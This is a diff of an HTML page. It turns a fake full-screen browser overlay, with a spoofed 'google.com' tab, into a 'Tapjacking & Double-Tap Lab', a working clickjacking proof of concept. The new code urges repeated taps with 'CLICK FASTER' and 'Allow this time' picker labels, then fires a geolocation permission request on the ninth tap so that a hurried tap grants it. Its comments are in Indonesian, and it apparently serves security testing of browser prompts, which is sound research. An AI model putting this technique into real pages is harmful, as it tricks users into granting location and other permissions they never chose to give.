@@ -1,178 +1,113 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Full Screen Overlay</title>
-
-<style>
-* {
-    box-sizing: border-box;
-}
-
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #202124;
-    color: white;
-    text-align: center;
-}
-
-.content {
-    padding: 80px 20px;
-}
-
-button {
-    padding: 14px 25px;
-    font-size: 17px;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    margin: 5px;
-}
-
-.open-btn {
-    background: #4285f4;
-    color: white;
-}
-
-.close-btn {
-    background: #5f6368;
-    color: white;
-}
-
-/* Full viewport overlay */
-.fake-overlay {
-    position: fixed;
-    inset: 0;
-    width: 100%;
-    height: 100%;
-    background: #202124;
-    z-index: 999999;
-    display: none;
-    overflow: hidden;
-}
-
-.fake-overlay.show {
-    display: block;
-}
-
-/* Background image */
-.overlay-image {
-    position: absolute;
-    inset: 0;
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-
-/* Image shade */
-.image-dark {
-    position: absolute;
-    inset: 0;
-    background: rgba(0,0,0,0.25);
-}
-
-/* Controls */
-.overlay-controls {
-    position: absolute;
-    top: 20px;
-    right: 20px;
-    z-index: 10;
-}
-
-.overlay-controls button {
-    background: #34383b;
-    color: white;
-    border: 1px solid #777;
-}
-
-/* Bottom label */
-.fake-tab {
-    position: absolute;
-    bottom: 0;
-    right: 30px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    padding: 13px 22px;
-    background: #34383b;
-    color: white;
-    border: 1px solid #777;
-    border-radius: 12px 12px 0 0;
-    z-index: 10;
-}
-
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Tapjacking & Double-Tap Lab</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #121212;
+            color: #e0e0e0;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-end;
+            min-height: 90vh;
+            cursor: pointer;
+        }
+        h1 {
+            color: #ff5252;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        .info-box {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            padding: 10px;
+            border-radius: 6px;
+            max-width: 500px;
+            width: 100%;
+            font-size: 11px;
+            color: #b0b0b0;
+            margin-top: 15px;
+            text-align: left;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
+        .interactive-zone {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="content">
+    <h1>⚠️ Double-Tap Interaction Lab</h1>
+    <p style="font-size: 12px; color: #888;">Simulasi pengujian respons klik ganda terhadap kemunculan dialog izin.</p>
 
-    <h2>Full Screen Overlay</h2>
+    <div class="interactive-zone">
+        <input id="input" type="time" list="times" style="display:none;" />
+        <datalist id="times">
+            <select>
+                <option label="--">00:00</option>
+                <option label="--">00:01</option>
+                <option label="        Allow this time        ">00:02</option>
+                <option label="--">00:03</option>
+                <option label="--">00:04</option>
+                <option label="        CLICK FASTER🔴        ">00:05</option>
 
-    <button class="open-btn" onclick="showOverlay()">
-        OPEN OVERLAY
-    </button>
-
-    <button class="close-btn" onclick="hideOverlay()">
-        CLOSE OVERLAY
-    </button>
-
-    <p id="status">Status: Waiting...</p>
-
-</div>
-
-<div class="fake-overlay" id="fakeOverlay">
-
-    <img
-        class="overlay-image"
-        id="overlayImage"
-        alt="Background image"
-    >
-
-    <div class="image-dark"></div>
-
-    <div class="overlay-controls">
-        <button onclick="hideOverlay()">
-            CLOSE ✕
-        </button>
+                <option label="--">00:06</option>
+                <option label="        CLICK FASTER 🔴        ">00:07</option>
+               <option label="        CLICK FASTER 🔴        ">00:08</option>
+                <option label="--">CLICK FASTER  🔴</option>
+                <option label="--">CLICK FASTER  🔴</option>
+            </select>
+        </datalist>
     </div>
 
-    <div class="fake-tab">
-        🌐 google.com
+    <div class="info-box" id="log-box">
+        <strong>Status Log:</strong> Menunggu interaksi klik...
     </div>
-
-</div>
 
 <script>
-const overlay = document.getElementById("fakeOverlay");
-const image = document.getElementById("overlayImage");
-const status = document.getElementById("status");
+    const logBox = document.getElementById('log-box');
 
-const images = [
-    "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=1920",
-    "https://images.unsplash.com/photo-1470770841072-f978cf4d019e?w=1920",
-    "https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1920",
-    "https://images.unsplash.com/photo-1470252649378-9c29740c9fa8?w=1920"
-];
+    function appendLog(msg) {
+        console.log(msg);
+        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.scrollTop = logBox.scrollHeight;
+    }
 
-function showOverlay() {
-    const random = Math.floor(Math.random() * images.length);
+    let clickCount = 0;
 
-    image.src = images[random];
+    document.body.onclick = async () => {
+        clickCount++;
+        appendLog(`Ketukan ke-${clickCount} terdeteksi.`);
 
-    overlay.classList.add("show");
+        try {
+            // Memanggil showPicker berdasarkan validasi token aktivasi
+            input.showPicker();
+            appendLog("showPicker() berhasil dipicu pada ketukan ini.");
+        } catch (e) {
+            appendLog("[Ditolak oleh Sistem]: " + e.message);
+        }
 
-    status.textContent = "Overlay active";
-}
-
-function hideOverlay() {
-    overlay.classList.remove("show");
-
-    status.textContent = "Overlay closed";
-}
+        // Memanggil geolokasi untuk memunculkan dialog izin sistem tepat pada ketukan ke-9
+        if (clickCount === 9) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { appendLog("Geolokasi diizinkan: " + pos.coords.latitude); },
+                (err) => { appendLog("Geolokasi ditolak/error: " + err.message); }
+            );
+        }
+    };
 </script>
 
 </body>
